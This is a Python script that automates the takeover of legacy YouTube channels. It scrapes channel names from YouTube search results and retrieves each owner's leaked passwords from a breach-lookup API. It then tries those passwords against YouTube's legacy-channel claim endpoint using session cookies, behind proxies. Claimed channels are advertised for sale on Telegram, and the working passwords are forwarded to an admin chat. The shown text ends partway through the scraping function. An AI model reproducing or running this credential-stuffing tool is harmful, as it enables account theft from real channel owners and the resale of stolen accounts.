import undetected_chromedriver as uc
import json
import threading
import queue
import random
from random import randint
import time
import requests
from colorama import Fore, init
from bs4 import BeautifulSoup
from urllib.parse import unquote
import inspect
from datetime import datetime

init(convert=True)

def check_config():
    global config
    print(f"{Fore.LIGHTBLUE_EX}Checking config...")
    proxy_fails = 0
    while True:
        try:
            response = requests.get("https://www.myexternalip.com/raw", proxies={"http": config["proxy"], "https": config["proxy"]}, timeout=(config["proxy_timeout"]))
            time.sleep(0.5)
        except:
            if proxy_fails > config["max_proxy_fails"]:
                print(f'{Fore.RED}[ERROR] Proxy not working, too many proxy fails')
                return False
            print(f'{Fore.YELLOW}[ERROR] Timeout, retrying... | Attempts: [{Fore.RED}{proxy_fails}{Fore.YELLOW}]')
            proxy_fails = proxy_fails+1
        else:
            print(f"{Fore.LIGHTGREEN_EX}[Success] Proxy working, IP: [{Fore.BLUE}{response.text}{Fore.GREEN}]")
            break
    
    while True:
        response = requests.get(f"https://leakcheck.net/api/?key={config['leakcheck_api_key']}&check=seehaas&type=login")
        if response.status_code == 200:
            break
        else:
            print(f"{Fore.YELLOW}Leakcheck request status code not 200, retrying...")
    if response.json()["success"] == False:
        if response.json()["error"] == "IP linking is required":
            print(f"{Fore.RED}[ERROR] Leakcheck IP not linked")
            return False
        else:
            print(f"{Fore.RED}[ERROR] Leakcheck test failed. Response: [{Fore.WHITE}{response.json()}{Fore.RED}]")
            return False
    else:
        print(f"{Fore.LIGHTGREEN_EX}[Success] Leakcheck working")

    for i in range(len(config["accounts-1k-10k"])):
        proxy_fails = 0
        email = config["accounts-1k-10k"][i]["email"]
        json = {"context":{"client":{"hl":"en","gl":"HR","remoteHost":"95.168.121.5","deviceMake":"","deviceModel":"","visitorData":config["accounts-1k-10k"][i]["x-goog-visitor-id"],"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36,gzip(gfe)","clientName":"WEB","clientVersion":"2.20220916.00.00","osName":"Windows","osVersion":"10.0","originalUrl":"https://www.youtube.com/gaia_link","platform":"DESKTOP","clientFormFactor":"UNKNOWN_FORM_FACTOR","configInfo":{"appInstallData":"CLPvoY8GEJjqrQUQveutBRCA6q0FELfLrQUQu8f9EhC9qq0FEPXK_RIQ2L6tBRCR-PwS"},"userInterfaceTheme":"USER_INTERFACE_THEME_DARK","timeZone":"Europe/Zagreb","browserName":"Chrome","browserVersion":"97.0.4692.71","screenWidthPoints":891,"screenHeightPoints":937,"screenPixelDensity":1,"screenDensityFloat":1,"utcOffsetMinutes":60,"connectionType":"CONN_CELLULAR_4G","memoryTotalKbytes":"8000000","mainAppWebInfo":{"graftUrl":"https://www.youtube.com/account","pwaInstallabilityStatus":"PWA_INSTALLABILITY_STATUS_CAN_BE_INSTALLED","webDisplayMode":"WEB_DISPLAY_MODE_BROWSER","isWebNativeShareAvailable":True}},"user":{"lockedSafetyMode":False},"request":{"useSsl":True,"internalExperimentFlags":[],"consistencyTokenJars":[]},"clickTracking":{"clickTrackingParams":"CCgQuy8YASITCOzJheTWvvUCFU4bBgAdtcAO8w=="},"adSignalsInfo":{"params":[{"key":"dt","value":"1642624951175"},{"key":"flash","value":"0"},{"key":"frm","value":"0"},{"key":"u_tz","value":"60"},{"key":"u_his","value":"1"},{"key":"u_h","value":"1080"},{"key":"u_w","value":"1920"},{"key":"u_ah","value":"1040"},{"key":"u_aw","value":"1920"},{"key":"u_cd","value":"24"},{"key":"bc","value":"31"},{"key":"bih","value":"937"},{"key":"biw","value":"875"},{"key":"brdim","value":"0,0,0,0,1920,0,1920,1040,891,937"},{"key":"vis","value":"1"},{"key":"wgl","value":"true"},{"key":"ca_type","value":"image"}]}},"legacyYoutubeChannelUsername":f"{randint(1,99999)}","legacyYoutubeChannelPassword":f"{randint(1,99999)}"}
        endpoint = "https://www.youtube.com/youtubei/v1/channel/claim_legacy_youtube_channel?key=AIzaSyAO_FJ2SlqU8Q4STEHLGCilw_Y9_11qcW8"
        headers = {
                    "authorization": config["accounts-1k-10k"][i]["authorization"],
                    "cookie": config["accounts-1k-10k"][i]["cookie"],
                    "x-client-data": "CJe2yQEIpLbJAQjBtskBCKmdygEI4oHLAQjx8MsBCOvyywEInvnLAQjX/MsBCOeEzAEI0o/MAQjZkMwBCOiVzAEI3pbMAQjxlswBGIyeywE=",
                    "x-goog-authuser": config["accounts-1k-10k"][i]["x-goog-authuser"],
                    "x-goog-visitor-id": config["accounts-1k-10k"][i]["x-goog-visitor-id"],
                    "x-origin": "https://www.youtube.com",
                    "x-youtube-client-name": "1",
                    "x-youtube-client-version": "2.20220916.00.00",
                }
        while True:
            try:
                response = requests.post(endpoint, headers=headers, json=json, timeout=(config["proxy_timeout"]))
            except:
                proxy_fails = proxy_fails+1
                if proxy_fails > config["max_proxy_fails"]:
                    print(f'{Fore.RED}[ERROR] Proxy not working, too many proxy fails')
                    return False
                else:
                    print(f'{Fore.LIGHTWHITE_EX}[PROXY] Timeout, retrying... | Attempts: [{Fore.RED}{proxy_fails}{Fore.LIGHTWHITE_EX}]')
                    time.sleep(0.5)
            else:
                break
        if "settingsUpdateOptionsCommand" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (1k-10k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Channel not available to be claimed" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (1k-10k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Too many login failures for this channel" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (1k-10k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Incorrect username or password" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (1k-10k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "An error occurred while claiming this channel" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (1k-10k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "You must be signed in to perform this operation" in str(response.json()):
            print(f"{Fore.RED}[ERROR] Google Account (1k-10k) not working: [{Fore.MAGENTA}{email}{Fore.RED}]")
            return False
        else:
            print(f'{Fore.YELLOW}[ERROR] Unknown response while claim request with account ({email}): {Fore.WHITE}| {str(response.json())}')
            return False

    for i in range(len(config["accounts-10k-100k"])):
        proxy_fails = 0
        email = config["accounts-10k-100k"][i]["email"]
        json = {"context":{"client":{"hl":"en","gl":"HR","remoteHost":"95.168.121.5","deviceMake":"","deviceModel":"","visitorData":config["accounts-10k-100k"][i]["x-goog-visitor-id"],"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36,gzip(gfe)","clientName":"WEB","clientVersion":"2.20220916.00.00","osName":"Windows","osVersion":"10.0","originalUrl":"https://www.youtube.com/gaia_link","platform":"DESKTOP","clientFormFactor":"UNKNOWN_FORM_FACTOR","configInfo":{"appInstallData":"CLPvoY8GEJjqrQUQveutBRCA6q0FELfLrQUQu8f9EhC9qq0FEPXK_RIQ2L6tBRCR-PwS"},"userInterfaceTheme":"USER_INTERFACE_THEME_DARK","timeZone":"Europe/Zagreb","browserName":"Chrome","browserVersion":"97.0.4692.71","screenWidthPoints":891,"screenHeightPoints":937,"screenPixelDensity":1,"screenDensityFloat":1,"utcOffsetMinutes":60,"connectionType":"CONN_CELLULAR_4G","memoryTotalKbytes":"8000000","mainAppWebInfo":{"graftUrl":"https://www.youtube.com/account","pwaInstallabilityStatus":"PWA_INSTALLABILITY_STATUS_CAN_BE_INSTALLED","webDisplayMode":"WEB_DISPLAY_MODE_BROWSER","isWebNativeShareAvailable":True}},"user":{"lockedSafetyMode":False},"request":{"useSsl":True,"internalExperimentFlags":[],"consistencyTokenJars":[]},"clickTracking":{"clickTrackingParams":"CCgQuy8YASITCOzJheTWvvUCFU4bBgAdtcAO8w=="},"adSignalsInfo":{"params":[{"key":"dt","value":"1642624951175"},{"key":"flash","value":"0"},{"key":"frm","value":"0"},{"key":"u_tz","value":"60"},{"key":"u_his","value":"1"},{"key":"u_h","value":"1080"},{"key":"u_w","value":"1920"},{"key":"u_ah","value":"1040"},{"key":"u_aw","value":"1920"},{"key":"u_cd","value":"24"},{"key":"bc","value":"31"},{"key":"bih","value":"937"},{"key":"biw","value":"875"},{"key":"brdim","value":"0,0,0,0,1920,0,1920,1040,891,937"},{"key":"vis","value":"1"},{"key":"wgl","value":"true"},{"key":"ca_type","value":"image"}]}},"legacyYoutubeChannelUsername":f"{randint(1,99999)}","legacyYoutubeChannelPassword":f"{randint(1,99999)}"}
        endpoint = "https://www.youtube.com/youtubei/v1/channel/claim_legacy_youtube_channel?key=AIzaSyAO_FJ2SlqU8Q4STEHLGCilw_Y9_11qcW8"
        headers = {
                    "authorization": config["accounts-10k-100k"][i]["authorization"],
                    "cookie": config["accounts-10k-100k"][i]["cookie"],
                    "x-client-data": "CJe2yQEIpLbJAQjBtskBCKmdygEI4oHLAQjx8MsBCOvyywEInvnLAQjX/MsBCOeEzAEI0o/MAQjZkMwBCOiVzAEI3pbMAQjxlswBGIyeywE=",
                    "x-goog-authuser": config["accounts-10k-100k"][i]["x-goog-authuser"],
                    "x-goog-visitor-id": config["accounts-10k-100k"][i]["x-goog-visitor-id"],
                    "x-origin": "https://www.youtube.com",
                    "x-youtube-client-name": "1",
                    "x-youtube-client-version": "2.20220916.00.00",
                }
        while True:
            try:
                response = requests.post(endpoint, headers=headers, json=json, timeout=(config["proxy_timeout"]))
            except:
                proxy_fails = proxy_fails+1
                if proxy_fails > config["max_proxy_fails"]:
                    print(f'{Fore.RED}[ERROR] Proxy not working, too many proxy fails')
                    return False
                else:
                    print(f'{Fore.LIGHTWHITE_EX}[PROXY] Timeout, retrying... | Attempts: [{Fore.RED}{proxy_fails}{Fore.LIGHTWHITE_EX}]')
                    time.sleep(0.5)
            else:
                break
        if "settingsUpdateOptionsCommand" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (10k-100k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Channel not available to be claimed" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (10k-100k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Too many login failures for this channel" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (10k-100k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Incorrect username or password" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (10k-100k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "An error occurred while claiming this channel" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (10k-100k) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "You must be signed in to perform this operation" in str(response.json()):
            print(f"{Fore.RED}[ERROR] Google Account (10k-100k) not working: [{Fore.MAGENTA}{email}{Fore.RED}]")
            return False
        else:
            print(f'{Fore.YELLOW}[ERROR] Unknown response while claim request with account ({email}): {Fore.WHITE}| {str(response.json())}')
            return False

    for i in range(len(config["accounts-100k+"])):
        proxy_fails = 0
        email = config["accounts-100k+"][i]["email"]
        json = {"context":{"client":{"hl":"en","gl":"HR","remoteHost":"95.168.121.5","deviceMake":"","deviceModel":"","visitorData":config["accounts-100k+"][i]["x-goog-visitor-id"],"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36,gzip(gfe)","clientName":"WEB","clientVersion":"2.20220916.00.00","osName":"Windows","osVersion":"10.0","originalUrl":"https://www.youtube.com/gaia_link","platform":"DESKTOP","clientFormFactor":"UNKNOWN_FORM_FACTOR","configInfo":{"appInstallData":"CLPvoY8GEJjqrQUQveutBRCA6q0FELfLrQUQu8f9EhC9qq0FEPXK_RIQ2L6tBRCR-PwS"},"userInterfaceTheme":"USER_INTERFACE_THEME_DARK","timeZone":"Europe/Zagreb","browserName":"Chrome","browserVersion":"97.0.4692.71","screenWidthPoints":891,"screenHeightPoints":937,"screenPixelDensity":1,"screenDensityFloat":1,"utcOffsetMinutes":60,"connectionType":"CONN_CELLULAR_4G","memoryTotalKbytes":"8000000","mainAppWebInfo":{"graftUrl":"https://www.youtube.com/account","pwaInstallabilityStatus":"PWA_INSTALLABILITY_STATUS_CAN_BE_INSTALLED","webDisplayMode":"WEB_DISPLAY_MODE_BROWSER","isWebNativeShareAvailable":True}},"user":{"lockedSafetyMode":False},"request":{"useSsl":True,"internalExperimentFlags":[],"consistencyTokenJars":[]},"clickTracking":{"clickTrackingParams":"CCgQuy8YASITCOzJheTWvvUCFU4bBgAdtcAO8w=="},"adSignalsInfo":{"params":[{"key":"dt","value":"1642624951175"},{"key":"flash","value":"0"},{"key":"frm","value":"0"},{"key":"u_tz","value":"60"},{"key":"u_his","value":"1"},{"key":"u_h","value":"1080"},{"key":"u_w","value":"1920"},{"key":"u_ah","value":"1040"},{"key":"u_aw","value":"1920"},{"key":"u_cd","value":"24"},{"key":"bc","value":"31"},{"key":"bih","value":"937"},{"key":"biw","value":"875"},{"key":"brdim","value":"0,0,0,0,1920,0,1920,1040,891,937"},{"key":"vis","value":"1"},{"key":"wgl","value":"true"},{"key":"ca_type","value":"image"}]}},"legacyYoutubeChannelUsername":f"{randint(1,99999)}","legacyYoutubeChannelPassword":f"{randint(1,99999)}"}
        endpoint = "https://www.youtube.com/youtubei/v1/channel/claim_legacy_youtube_channel?key=AIzaSyAO_FJ2SlqU8Q4STEHLGCilw_Y9_11qcW8"
        headers = {
                    "authorization": config["accounts-100k+"][i]["authorization"],
                    "cookie": config["accounts-100k+"][i]["cookie"],
                    "x-client-data": "CJe2yQEIpLbJAQjBtskBCKmdygEI4oHLAQjx8MsBCOvyywEInvnLAQjX/MsBCOeEzAEI0o/MAQjZkMwBCOiVzAEI3pbMAQjxlswBGIyeywE=",
                    "x-goog-authuser": config["accounts-100k+"][i]["x-goog-authuser"],
                    "x-goog-visitor-id": config["accounts-100k+"][i]["x-goog-visitor-id"],
                    "x-origin": "https://www.youtube.com",
                    "x-youtube-client-name": "1",
                    "x-youtube-client-version": "2.20220916.00.00",
                }
        while True:
            try:
                response = requests.post(endpoint, headers=headers, json=json, timeout=(config["proxy_timeout"]))
            except:
                proxy_fails = proxy_fails+1
                if proxy_fails > config["max_proxy_fails"]:
                    print(f'{Fore.RED}[ERROR] Proxy not working, too many proxy fails')
                    return False
                else:
                    print(f'{Fore.LIGHTWHITE_EX}[PROXY] Timeout, retrying... | Attempts: [{Fore.RED}{proxy_fails}{Fore.LIGHTWHITE_EX}]')
                    time.sleep(0.5)
            else:
                break
        if "settingsUpdateOptionsCommand" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (100k+) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Channel not available to be claimed" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (100k+) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Too many login failures for this channel" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (100k+) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "Incorrect username or password" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (100k+) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "An error occurred while claiming this channel" in str(response.json()):
            print(f"{Fore.LIGHTGREEN_EX}[Success] Google Account (100k+) is working: [{Fore.MAGENTA}{email}{Fore.LIGHTGREEN_EX}]")
        elif "You must be signed in to perform this operation" in str(response.json()):
            print(f"{Fore.RED}[ERROR] Google Account (100k+) not working: [{Fore.MAGENTA}{email}{Fore.RED}]")
            return False
        else:
            print(f'{Fore.YELLOW}[ERROR] Unknown response while claim request with account ({email}): {Fore.WHITE}| {str(response.json())}')
            return False

    print(f"{Fore.LIGHTGREEN_EX}[Success] Everything is working")
    return True

def save_log(log):
    curframe = inspect.currentframe()
    calframe = inspect.getouterframes(curframe, 2)
    calname = calframe[1][3]
    with open("./_data/logs.txt", "a", encoding="utf-8") as log_file:
        log_file.write(f"------------------------------{calname}------------------------------\n{datetime.now().strftime('%Y-%m-%d_%H:%M:%S')}\n{log}\n")

def send_tg(chat, message):
    global config
    api_key = config["telegram_bot_api_key"]
    channel_id = config["telegram_channel_chat_id"]
    admin_id = config["telegram_admin_chat_id"]
    if chat == "admin":
        chat_id = admin_id
    else:
        chat_id = channel_id
    response = requests.get(f"https://api.telegram.org/bot{api_key}/sendMessage?chat_id={chat_id}&text={message}").json()
    if not response["ok"] == True:
        print(f"{Fore.RED}[ERROR] Failed to send telegram message: [{Fore.WHITE}{message}{Fore.RED}]")

def get_channel_stats(channel):
    global config
    all_google_accounts = config["accounts-1k-10k"] + config["accounts-10k-100k"] + config["accounts-100k+"]
    request_fails = 0
    while True:
        random_acc = random.choice(all_google_accounts)
        try:
            response = requests.get(f"https://www.youtube.com{channel}/about", headers={"cookie": random_acc["cookie"]}, timeout=(10)).text
        except:
            request_fails = request_fails+1
            print(f"{Fore.LIGHTRED_EX}[ERROR] Failed to get channel statistics, retrying...")
            if request_fails > 2:
                return "unknown", "unknown", "unknown"
            time.sleep(0.5)
        else:
            break
    try:
        views = str(int(response.split(' views"},')[0].split('"simpleText":"')[-1].replace(",", "").replace(".", "")))
    except:
        views = "unknown"
    if ' subscribers"},' in response:
        subs = str(int(response.split(' subscribers"},')[0].split('"simpleText":"')[-1].replace(",", "").replace(".", "").replace("K", "0")))
    elif '1 subscriber"},' in response:
        subs = "1"
    else:
        subs = "hidden"
    try:
        date = response.split('"}]},"canonicalChannelUrl"')[0].split('"text":"')[-1]
    except:
        date = "unknown"
    return views, subs, date

def get_passwords(username, thread_number):
    global config
    while True:
        try:
            response = requests.get(f"https://leakcheck.net/api/?key={config['leakcheck_api_key']}&check={(username)}&type=login")
        except:
            time.sleep(0.5)
        else:
            if response.status_code == 200:
                break
            elif response.status_code == 429:
                #print(f"{Fore.CYAN}[Thread {thread_number}] {Fore.WHITE}Leakcheck request rate limited")
                time.sleep(random.uniform(0.01, 0.03))
            elif response.status_code == 504:
                print(f"{Fore.CYAN}[Thread {thread_number}] {Fore.YELLOW}Leakcheck server slow")
                time.sleep(random.uniform(0.1, 0.3))
            else:
                print(f"{Fore.CYAN}[Thread {thread_number}] {Fore.YELLOW}Leakcheck request status code not 200: [{Fore.LIGHTRED_EX}{response.status_code}{Fore.YELLOW}]")
    if response.json()["success"] == False:
        if response.json()["error"] == "Not found":
            return "_NORESULTS_"
        elif response.json()["error"] == "IP linking is required":
            print(f"{Fore.RED}[ERROR] Leakcheck IP not linked")
            exit()
        else:
            save_log(f"[ERROR] Leakcheck lookup [{username}] failed, response: [{response.json()}]\n")
            return "_ERROR_"
    else:
        results = response.json()["result"]
        if len(results) > 10:
            return "_TOOMANYRESULTS_"
        else:
            return results

def send_claim_request(username, password, views, thread_number):
    global config
    proxy_fails = 0
    while True:
        if int(views) < 10000:
            random_acc = random.choice(config["accounts-1k-10k"])
        elif int(views) > 10000 and int(views) < 100000:
            random_acc = random.choice(config["accounts-10k-100k"])
        elif int(views) > 100000:
            random_acc = random.choice(config["accounts-100k+"])
        else:
            return ["UNKNOWNRESPONSE"]
        json = {"context":{"client":{"hl":"en","gl":"HR","remoteHost":"95.168.121.5","deviceMake":"","deviceModel":"","visitorData":random_acc["x-goog-visitor-id"],"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36,gzip(gfe)","clientName":"WEB","clientVersion":"2.20220916.00.00","osName":"Windows","osVersion":"10.0","originalUrl":"https://www.youtube.com/gaia_link","platform":"DESKTOP","clientFormFactor":"UNKNOWN_FORM_FACTOR","configInfo":{"appInstallData":"CLPvoY8GEJjqrQUQveutBRCA6q0FELfLrQUQu8f9EhC9qq0FEPXK_RIQ2L6tBRCR-PwS"},"userInterfaceTheme":"USER_INTERFACE_THEME_DARK","timeZone":"Europe/Zagreb","browserName":"Chrome","browserVersion":"97.0.4692.71","screenWidthPoints":891,"screenHeightPoints":937,"screenPixelDensity":1,"screenDensityFloat":1,"utcOffsetMinutes":60,"connectionType":"CONN_CELLULAR_4G","memoryTotalKbytes":"8000000","mainAppWebInfo":{"graftUrl":"https://www.youtube.com/account","pwaInstallabilityStatus":"PWA_INSTALLABILITY_STATUS_CAN_BE_INSTALLED","webDisplayMode":"WEB_DISPLAY_MODE_BROWSER","isWebNativeShareAvailable":True}},"user":{"lockedSafetyMode":False},"request":{"useSsl":True,"internalExperimentFlags":[],"consistencyTokenJars":[]},"clickTracking":{"clickTrackingParams":"CCgQuy8YASITCOzJheTWvvUCFU4bBgAdtcAO8w=="},"adSignalsInfo":{"params":[{"key":"dt","value":"1642624951175"},{"key":"flash","value":"0"},{"key":"frm","value":"0"},{"key":"u_tz","value":"60"},{"key":"u_his","value":"1"},{"key":"u_h","value":"1080"},{"key":"u_w","value":"1920"},{"key":"u_ah","value":"1040"},{"key":"u_aw","value":"1920"},{"key":"u_cd","value":"24"},{"key":"bc","value":"31"},{"key":"bih","value":"937"},{"key":"biw","value":"875"},{"key":"brdim","value":"0,0,0,0,1920,0,1920,1040,891,937"},{"key":"vis","value":"1"},{"key":"wgl","value":"true"},{"key":"ca_type","value":"image"}]}},"legacyYoutubeChannelUsername":f"{username}","legacyYoutubeChannelPassword":f"{password}"}
        endpoint = "https://www.youtube.com/youtubei/v1/channel/claim_legacy_youtube_channel?key=AIzaSyAO_FJ2SlqU8Q4STEHLGCilw_Y9_11qcW8"
        headers = {
                    "authorization": random_acc["authorization"],
                    "cookie": random_acc["cookie"],
                    "x-client-data": "CJe2yQEIpLbJAQjBtskBCKmdygEI4oHLAQjx8MsBCOvyywEInvnLAQjX/MsBCOeEzAEI0o/MAQjZkMwBCOiVzAEI3pbMAQjxlswBGIyeywE=",
                    "x-goog-authuser": random_acc["x-goog-authuser"],
                    "x-goog-visitor-id": random_acc["x-goog-visitor-id"],
                    "x-origin": "https://www.youtube.com",
                    "x-youtube-client-name": "1",
                    "x-youtube-client-version": "2.20220916.00.00",
                }
        try:
            response = requests.post(endpoint, headers=headers, json=json, proxies={"http": config["proxy"], "https": config["proxy"]}, timeout=(config["proxy_timeout"]))
        except:
            proxy_fails = proxy_fails+1
            if proxy_fails > config["max_proxy_fails"]:
                return ["TOOMANYPROXYFAILS", random_acc["email"]]
            else:
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTWHITE_EX}[PROXY] Timeout, retrying... | Attempts: [{Fore.RED}{proxy_fails}{Fore.LIGHTWHITE_EX}]')
                time.sleep(0.5)
        else:
            break
    if "settingsUpdateOptionsCommand" in str(response.json()):
        return ["Claimed", random_acc["email"]]
    elif "Channel not available to be claimed" in str(response.json()):
        return ["Taken", random_acc["email"]]
    elif "Too many login failures for this channel" in str(response.json()):
        return ["Too many failures", random_acc["email"]]
    elif "Incorrect username or password" in str(response.json()):
        return ["Incorrect credentials", random_acc["email"]]
    elif "An error occurred while claiming this channel" in str(response.json()):
        return ["An error occurred", random_acc["email"]]
    elif "Internal error encountered" in str(response.json()):
        return ["An error occurred", random_acc["email"]]
    elif "The service is currently unavailable" in str(response.json()):
        return ["An error occurred", random_acc["email"]]
    elif "You must be signed in to perform this operation" in str(response.json()):
        email = random_acc["email"]
        save_log(f"Account logged out ({email}):\n")
        return ["Signed Out", random_acc["email"]]
    else:
        email = random_acc["email"]
        print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.YELLOW}[ERROR] Unknown response while claim request with account ({email}): {Fore.WHITE}| {str(response.json())}')
        save_log(f"Unknown response while claim request with account ({email}):\n{response.json()}\n")
        return ["UNKNOWNRESPONSE", random_acc["email"]]

def claim_channel(channel, views, thread_number):
    global config
    username = unquote(channel.split("/")[-1])
    passwords = get_passwords(username, thread_number)
    if passwords == "_NORESULTS_":
        print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTRED_EX}[Leakcheck] No passwords found {Fore.MAGENTA}| {channel}')
        return
    elif passwords == "_TOOMANYRESULTS_":
        print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTRED_EX}[Leakcheck] Over 10 Passwords found {Fore.MAGENTA}| {channel}')
        return
    elif passwords == "_ERROR_":
        print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.RED}[Leakcheck] Leakcheck lookup failed {Fore.MAGENTA}| {channel}')
        return

    for i in passwords:
        password = i["line"].split(":")[1]
        break_outer = False
        while True:
            response = send_claim_request(username, password, views, thread_number)
            if response[0] == "Taken":
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.YELLOW}[FAIL] Not Available to be Claimed {Fore.MAGENTA}| {channel}')
                break_outer = True
                break
            elif response[0] == "Claimed":
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.GREEN}[CLAIM] Channel Claimed | {channel}')
                google_account = response[1]
                link = "https://www.youtube.com"+channel
                views, subs, date = get_channel_stats(channel)
                if config["telegram_activated"] == True and int(views) >= config["telegram_view_minimum"]:
                    send_tg("channel", f"{link}\nViews: {views}\nSubs: {subs}\nCreation date: {date}\nPrice: DM @PymYT")
                if config["telegram_activated"] == True:
                    send_tg("admin", f"{link}\nViews: {views}\nSubs: {subs}\nCreation date: {date}\nAccount: {google_account}\nPassword: {password}")
                break_outer = True
                break
            elif response[0] == "Too many failures":
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTWHITE_EX}[FAIL] Too many Requests {Fore.MAGENTA}| {channel}')
                time.sleep(5)
            elif response[0] == "Incorrect credentials":
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTRED_EX}[FAIL] Incorrect account details {Fore.MAGENTA}| {channel}')
                break
            elif response[0] == "TOOMANYPROXYFAILS":
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.RED}[FAIL] Too many proxy Fails')
                break_outer = True
                break
            elif response[0] == "An error occurred":
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.RED}[FAIL] An (internal) error occured while claiming this channel')
            elif response[0] == "Signed Out":
                print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTRED_EX}[ERROR] You are {Fore.LIGHTYELLOW_EX}not signed in {Fore.LIGHTRED_EX}to your google account: ({Fore.LIGHTYELLOW_EX}{response[1]}{Fore.LIGHTRED_EX})')
                if config["telegram_activated"] == True:
                    send_tg("admin", f'[ERROR] You are not signed in to your google account: ({response[1]})')
            elif response[0] == "UNKNOWNRESPONSE":
                break
        if break_outer == True:
            break

def scrape_channels_from_keyword(keyword, thread_number):
    global config
    while True:
        print(f"{Fore.MAGENTA}[Thread {thread_number}] Started scraping keyword [{Fore.CYAN}{keyword}{Fore.MAGENTA}]")
        options = uc.ChromeOptions()
        options.add_argument("--lang="+config["browser_language"])
        options.headless = True
        try:
            driver = uc.Chrome(options=options)
            driver.get("https://www.youtube.com/results?search_query="+keyword+"+before:"+config["video_before"]+"&sp=EgIQAQ%253D%253D")
            while True:
                document_height_before = driver.execute_script("return document.documentElement.scrollHeight")
                driver.execute_script(f"window.scrollTo(0, {document_height_before + 2000});")
                time.sleep(2)
                document_height_after = driver.execute_script("return document.documentElement.scrollHeight")
                if document_height_after == document_height_before:
                    break
            soup = BeautifulSoup(driver.page_source, "html.parser")
            elements = soup.find_all("a", {"class": "yt-simple-endpoint style-scope yt-formatted-string"})
            elements = list(dict.fromkeys(elements))
        except Exception as e:
            print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTRED_EX}[ERROR] Couldnt scrape channels, retrying...')
            save_log(f"[ERROR] Couldnt scrape channels and pull soup:\n{repr(e)}\n{e}\n")
            try:
                driver.close()
            except:
                pass
            time.sleep(2)
        else:
            driver.close()
            break
            
    urls_and_views = []
    for element in elements:
        url = element.get("href")
        if unquote(url).isascii() == False:
            continue
        elif "policies" in url:
            continue
        elif "/channel/" in url:
            continue
        elif "playlist?list" in url:
            continue
        elif len(url.split("/")[-1]) < 4:
            continue
        else:
            all_google_accounts = config["accounts-1k-10k"] + config["accounts-10k-100k"] + config["accounts-100k+"]
            random_acc = random.choice(all_google_accounts)
            try:
                response = requests.get(f"https://www.youtube.com{url}/about", headers={"cookie": random_acc["cookie"]}, timeout=(10))
                if "This channel is not available in your country." in response.text:
                    continue
                elif "This channel is not available" in response.text:
                    continue
                elif "Something went wrong..." in response.text:
                    continue
                try:
                    views = int(response.text.split(' views"},')[0].split('"simpleText":"')[-1].replace(",", "").replace(".", ""))
                except:
                    continue
                if ' subscribers"},' in response.text:
                    subs = response.text.split(' subscribers"},')[0].split('"simpleText":"')[-1].replace(",", "").replace(".", "")
                elif '1 subscriber"},' in response:
                    subs = "1"
                else:
                    subs = "hidden"
                creation_date = response.text.split('"}]},"canonicalChannelUrl"')[0].split('"text":"')[-1]
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to check channel while scraping (1): [{Fore.WHITE}{url}{Fore.RED}]")
                save_log(f"[ERROR] Failed to check channel ({url}) while scraping (1):\n{e}\n")
            else:
